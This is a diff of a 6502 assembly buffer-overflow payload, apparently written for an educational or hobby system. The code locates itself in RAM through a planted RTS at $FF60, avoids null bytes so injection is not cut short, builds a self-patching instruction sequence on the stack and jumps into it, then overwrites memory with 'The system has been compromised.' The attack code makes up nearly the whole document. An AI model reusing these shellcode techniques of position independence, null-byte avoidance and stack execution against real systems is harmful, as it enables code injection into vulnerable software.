@@ -3,209 +3,204 @@
 #d "You are being hacked"  ; overflow the buffer
 
 RTS_OPCODE = 0x60
-JMP_IND_OPCODE = 0x6C
-STA_ABS_X_OPCODE = 0x9D
+JMP_ABS_OPCODE = 0x4C
+STA_ABS_XIDX_OPCODE = 0x9D
 LDA_ZPG_OPCODE = 0xA5
 LDX_IMM_OPCODE = 0xA2
-LDY_ABS_X_OPCODE = 0xBC
+LDY_ABS_XIDX_OPCODE = 0xBC
 
-RTS_LOCATION = 0xFF60
-STACK_SEQUENCE_START = 0xFF61
-STACK_SEQUENCE_EXIT = 0xFF63
+KNOWN_ADDR = 0xF8  ; pointer to location of payload in RAM
+MSG_ADDR = 0xFA  ; pointer to location of message string in RAM
+PATCH_EXIT = 0xFC  ; pointer to entry point of patch sequence
 
-MSG_HI_ADDR = 0xFF
-MSG_LO_ADDR = 0xFE
-
-KNOWN_HI_ADDR = 0xFD
-KNOWN_LO_ADDR = 0xFC
+; Can't go on Zero Page with others because of the 0x00 in high byte
+RTS_LOCATION = 0xFF60  ; location to write RTS opcode for PC determination
+PATCH_ENTER = 0xFF61  ; pointer to exit destination of patch sequence
 
 malicious_code:
-    ; the code must determine where in RAM its been installed, so that it can
-    ; calculate the proper address to refer to .msg by. Then, it must patch
-    ; that address into the payload (self modifying code)
+    ; The code must determine where in RAM its been installed, so that it can
+    ; calculate the proper address to refer to the message string by.
+    ; Then, it must patch that address into the payload (self modifying code)
 
-    ; in order to determine its location, we will jump into a subroutine and
-    ; immediately return so that the PC is on the stack. We need to JSR to an
-    ; abs addr that has an RTS in it. The payload cannot include the RTS as code
-    ; because the abs addr resolved at payload assembly time will be incorrect
+    ; specifically that is in one location, at the sty abs x indexed instruction
+    ; which loads the string char by char in order to store them to the Zero Page.
 
-    ; so, the payload must install an RTS on the target system. RTS opcode is
-    ; $60 will install it at $FF60 as an homage to the Apple II sysyem which
+    ; In order to determine its location, we will jump into a subroutine, as this
+    ; pushes the PC to the stack. The subroutine can be effectively empty, only
+    ; containing an RTS. After the routine returns, the bytes immediately above the
+    ; SP will be that of the PC.
+
+    ; The payload cannot contain the RTS directly, as JSR has only an absolute
+    ; addressing mode, and that address will not be known at assembly time for the
+    ; reasons described above.
+
+    ; So, the payload must install an RTS on the target system. RTS opcode is
+    ; $60 and we will install it at $FF60 as an homage to the Apple II sysyem which
     ; also kept an RTS in this position so that other code could relocate itself.
 
-    ; install the subroutine
+    ; Install the subroutine
     ldx #RTS_OPCODE
     stx RTS_LOCATION
 
-    ; jump to routine and then examine stack to determine location
+    ; Jump to routine and then examine stack to determine location
     jsr RTS_LOCATION
 
-    ; at this point, 0x0100 + S contains PC hi and 0x0101 + S contains PC lo
+    ; At this point, 0x0100 + S contains PC hi and 0x0101 + S contains PC lo
     known_location:
-        tsx  ; x = sp
+        tsx     ; x = sp
+
+    ; Here, we must index from 0x0101, as opposed to 0x0100, because if we used that,
+    ; then the low byte of that address (0x00) would be detected as a Null Terminator
+    ; by the target system, and prematurely end payload injection.
+    dex
+    ldy 0x0101, x       ; y = [0x0101 + S]  (y = PC hi)
+    sty KNOWN_ADDR + 1
 
     dex
-    ldy 0x0101, x  ; y = [0x0101 + S]  (y = PC hi)
+    ldy 0x0101, x       ; a = [0x0101 + S - 1]  (a = PC lo)
+    sty KNOWN_ADDR
 
-    dex
-    lda 0x0101, x  ; a = [0x0101 + S - 1]  (a = PC lo)
+    ; The Zero Page pointer KNOWN_ADDR now contains the absolute address of the byte
+    ; immediately preceding the tsx, in Little Endian format.
 
-    sty KNOWN_HI_ADDR
-    sta KNOWN_LO_ADDR
-
-    ; specifically, the location we've determined in A and Y points to the byte
-    ; immediately before the TSX instruction.
-
-    ; how many bytes are between that location and the start of that message?
-    ; need to determine this via the payload's binary. its a constant that can
-    ; be hardcoded.
-    ; from inspection, it seems to be 31 bytes.
-
-    ; so need to add 31 to PC lo, then add carry to PC hi
+    ; Now, we calculate the absolute address of the message string by adding its offset
+    ; from the known location to the known location, and store this address in the
+    ; Zero Page pointer MSG_ADDR.
+    lda KNOWN_ADDR
     clc
-    adc #MESSAGE_OFFSET  ; A = A + msg_offset
+    adc #MESSAGE_OFFSET     ; A = A + #MESSAGE_OFFSET
+    sta MSG_ADDR
 
-    pha  ; back it up on the stack
-    tya  ; A = Y
-    adc #1  ; A = A + 1 + Carry
-    tay  ; Y = A
-    dey  ; remove the 1 (needed that bc can't have 0 byte in payload)
+    lda KNOWN_ADDR + 1
+    adc #1                  ; A = A + 1 + Carry
+    tay                     ; Y = A
+    dey                     ; remove the 1 (needed that bc can't have 0 byte in payload)
+    sty MSG_ADDR + 1
 
-    pla  ; pull A back from stack
+    ; Now, *MSG_ADDR must be patched into the reference.
+    ; A new code sequence must be written into memory and then executed in order to
+    ; perform the patch. This is because the sequence to perform the patch includes
+    ; absolute addresses that were not known at assembly time (specifically *MSG_ADDR
+    ; which was just calculated), and there are no 6502 instructions to construct absolute
+    ; references at runtime (other than the indirect JMP, which does not help here)
 
-    ; So now A has the low byte of .msg and Y has the high byte
-    sty MSG_HI_ADDR
-    sta MSG_LO_ADDR
+    ; We *could* select an arbitrary location in the target system's RAM to write our
+    ; sequence to, but since that location would have to be selected by assembly time,
+    ; there's no guarantee that the payload will not be injected at a location that
+    ; overlaps with the selected address.
 
-    ; now, patch these values into the correct locations
+    ; The two "safe places" for us to write the sequence to are the Zero Page and the
+    ; stack. I've decided to write the sequence to the stack. So we will write the sequence
+    ; to the stack, jump into the stack to perform the patch, and then jump of the stack.
 
-    ; in order to jump to the beginning of an instruction sequence
-    ; like this on the stack, will first need to add 1 to SP.
-    ; then move SP into the PC. Need to put the SP into some fixed
-    ; location, and then do an indirect jump to it.
-    ; so need 2 bytes in a fixed location.
+    ; Before constructing the sequence on the stack, the address that we need to jump off
+    ; of the stack to needs to be determined. Specifically, this is to the beginning of
+    ; the real work section of the payload.
 
-    ; to exit this sequence off of the stack, need to jump to the
-    ; label "write_message". So need to compute its address, store
-    ; it into some fixed location, and then do an indirect jump to it.
-    ; so need 2 bytes in a fixed location.
-
-    ; so first, need to compute the address of "write_message" and store
-    ; it in the vector.
-
-    ; Compute and store lower half of vector
-    lda KNOWN_LO_ADDR
+    ; Compute and store lower half of address
+    lda KNOWN_ADDR
     clc
-    adc #LABEL_OFFSET  ; A = A + LABEL_OFFSET
-    sta STACK_SEQUENCE_EXIT
+    adc #LABEL_OFFSET   ; A = A + #LABEL_OFFSET
+    sta PATCH_EXIT
 
-    ; Compute and store upper half of vector
-    lda KNOWN_HI_ADDR
-    adc #1
-    tay
-    dey
-    sty STACK_SEQUENCE_EXIT + 1
+    ; Compute and store upper half of address
+    lda KNOWN_ADDR + 1
+    adc #1              ; A = A + 1 + C
+    tay                 ; Y = A
+    dey                 ; Y -= 1 ---> Y = A + 1
+    sty PATCH_EXIT + 1
 
-    ; Next, need to put this instruction stream on the stack
-    ; need to put it on backwards
+    ; Finally, the patching sequence can be constructed. The sequence is as follows:
 
-    ; --------------------------------------
+    ;       ldx #PATCH_LO_OFFSET
+    ;       lda MSG_LO_ADDR
+    ;       sta <known_location>, x
+    ;          
+    ;       ldx #PATCH_HI_OFFSET
+    ;       lda MSG_HI_ADDR
+    ;       sta <known_location>, x
+    ;       
+    ;       jmp PATCH_EXIT
 
-    ; ldx #PATCH_LO_OFFSET
-    ; lda MSG_HI_ADDR
-    ; sta <known_location>, x
+    ; Because the stack grows downwards, the sequence needs to be constructed backwards
+    ; This probably makes our lives harder because we need to pay very close attention
+    ; to our endianness and such.
 
-    ; ldx #PATCH_HI_OFFSET
-    ; lda MSG_LO_ADDR
-    ; sta <known_location>, x
-
-    ; jmp (STACK_SEQUENCE_EXIT)
-
-    ; --------------------------------------
-
-    ; 3 bytes: jmp (STACK_SEQUENCE_EXIT)
-    lda STACK_SEQUENCE_EXIT + 1
+    ; 3 bytes: jmp PATCH_EXIT
+    lda PATCH_EXIT + 1
     pha
-
-    lda STACK_SEQUENCE_EXIT
+    lda PATCH_EXIT
     pha
-
-    ; lda #JMP_IND_OPCODE
-    lda #0x4C  ; JMP_ABS_OPCODE
+    lda #JMP_ABS_OPCODE
     pha
 
     ; 3 bytes: sta <known_location>, x
-    lda KNOWN_HI_ADDR
+    lda KNOWN_ADDR + 1
+    pha
+    lda KNOWN_ADDR
+    pha
+    lda #STA_ABS_XIDX_OPCODE
     pha
 
-    lda KNOWN_LO_ADDR
+    ; 2 bytes: lda MSG_HI_ADDR
+    lda #(MSG_ADDR + 1)
     pha
-
-    lda #STA_ABS_X_OPCODE
-    pha
-
-    ; 2 bytes: lda MSG_LO_ADDR
-    lda #MSG_HI_ADDR
-    pha
-
     lda #LDA_ZPG_OPCODE
     pha
 
     ; 2 bytes: ldx #PATCH_HI_OFFSET
-    lda #PATCH_HI_OFFSET
+    lda #(PATCH_OFFSET + 1)
     pha
-
     lda #LDX_IMM_OPCODE
     pha
 
     ; 3 bytes: sta <known_location>, x
-    lda KNOWN_HI_ADDR
+    lda KNOWN_ADDR + 1
     pha
-
-    lda KNOWN_LO_ADDR
+    lda KNOWN_ADDR
     pha
-
-    lda #STA_ABS_X_OPCODE
+    lda #STA_ABS_XIDX_OPCODE
     pha
 
     ; 2 bytes: lda MSG_HI_ADDR
-    lda #MSG_LO_ADDR
+    lda #MSG_ADDR
     pha
-
     lda #LDA_ZPG_OPCODE
     pha
 
     ; 2 bytes: ldx #PATCH_LO_OFFSET
-    lda #PATCH_LO_OFFSET
+    lda #PATCH_OFFSET
     pha
-
     lda #LDX_IMM_OPCODE
     pha
 
-    ; -----------------------
-    tsx  ; grab the stack pointer
-    inx  ; increment by 1. x now points to beginning of program on stack
+    ; Now the patch sequence is on the stack, so we need to jump onto the stack.
+    ; Currently the SP points to the addr right below the entry point of the sequence.
+    ; Move SP to X, increment it by 1 to point to the beginning of the sequence.
+    ; Next, install this address to a fixed jump vector that we can jump on.
 
-    stx STACK_SEQUENCE_START
-    ldx #1
-    stx STACK_SEQUENCE_START + 1
+    tsx                     ; grab the stack pointer
+    inx                     ; increment by 1
+    stx PATCH_ENTER         ; save low byte
 
-    jmp (STACK_SEQUENCE_START)
+    ldx #0x01               ; SP high byte is a fixed 0x01
+    stx PATCH_ENTER + 1     ; save high byte
+
+    ; Finally, the address patch occurs
+    jmp (PATCH_ENTER)       ; use jump vector
 
     write_message:
-
         ; get a 0 into x
-        lda #1  ; a = 1
-        sec
-        sbc #1  ; a -= 1 (a = 0)
-        tax     ; x = a  (x = 0)
+        lda #1      ; a = 1
+        sec         ; set carry so that we don't borrow on sub
+        sbc #1      ; a -= 1 (a = 0)
+        tax         ; x = a  (x = 0)
 
         loop:
             cpx #message_len
             beq done
 
-            patch_location:
-                #d LDY_ABS_X_OPCODE, 0xFF, 0xFF
+            patch_location: ldy 0xADDE, x  ; $ADDE to be patched at runtime to point to message
 
             sty 1, x
 
@@ -213,8 +208,7 @@ malicious_code:
             clc
             bcc loop
 
-    done:
-        hlt
+    done:   hlt
 
 message:
     #d "The system has been compromised."
@@ -222,7 +216,6 @@ message_len = $ - message
 
 LABEL_OFFSET = write_message - known_location + 1
 MESSAGE_OFFSET = message - known_location + 1
-PATCH_HI_OFFSET = patch_location - known_location + 3
-PATCH_LO_OFFSET = patch_location - known_location + 2
+PATCH_OFFSET = patch_location - known_location + 2
 
-#d "\0"
+#d "\0"  ; end of payload
